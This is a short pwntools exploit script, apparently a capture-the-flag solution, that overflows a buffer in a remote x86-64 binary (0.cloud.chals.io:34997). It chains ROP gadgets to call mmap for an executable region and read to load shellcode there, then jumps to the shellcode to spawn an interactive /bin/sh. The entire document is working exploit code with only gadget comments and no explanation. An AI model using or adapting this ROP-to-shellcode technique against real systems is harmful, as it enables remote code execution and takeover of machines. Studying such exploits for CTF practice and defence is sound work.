# ==================================================================== #

from pwn import *

context.binary = elf = ELF(sys.argv[1])

# -------------------------------------------------------------------- #

P = lambda v : p32(v) if 32 == context.bits else p64(v)


sc = asm(shellcraft.amd64.linux.sh())

PAD = 40
BUF = 0x300000

pl = b''
#pl += P(0x401000)

# mmap()
# rdi: 0x1000
# rsi: 0x1000
# rdx: PROT_WRITE|PROT_READ|PROT_EXEC = 7
# r10: 0x22
# finalize 0x40102a

#0x000000000040111f: pop rdi; ret;
pl += P(0x40111f)
pl += P(BUF) # rdi
#0x0000000000401121: pop rsi; ret;
pl += P(0x401121)
pl += P(0x1000) # rsi
#0x0000000000401123: pop rdx; ret;
pl += P(0x401123)
pl += P(7)
# mmap()
pl += P(0x40102a)

# loop again
pl += (b'y'*PAD)

# read()
# rdi: 0
# rsi: 0x1000
# rdx: len(sc)
#0x000000000040111f: pop rdi; ret;
pl2 = P(0x40111f)
pl2 += P(0) # stdin
#0x0000000000401121: pop rsi; ret;
pl2 += P(0x401121)
pl2 += P(BUF)
#0x0000000000401123: pop rdx; ret;
pl2 += P(0x401123)
pl2 += P(len(sc))
# read()
pl2 += P(0x4010c1)
#pl2 += P(0x40109a)

# ret
# 0x0000000000401046: ret;
pl2 += P(0x401046)
pl2 += P(BUF)

# -------------------------------------------------------------------- #

io = remote('0.cloud.chals.io', 34997)

io.send(b'1'*0x21)
io.send((b'y'*PAD) + pl)
io.recvuntil('1'*0x21)

io.send(b'2'*0x21)
io.send((b'y'*PAD) + pl2)
io.recvuntil('2'*0x21)

io.send(sc)

io.interactive()

# ==================================================================== #
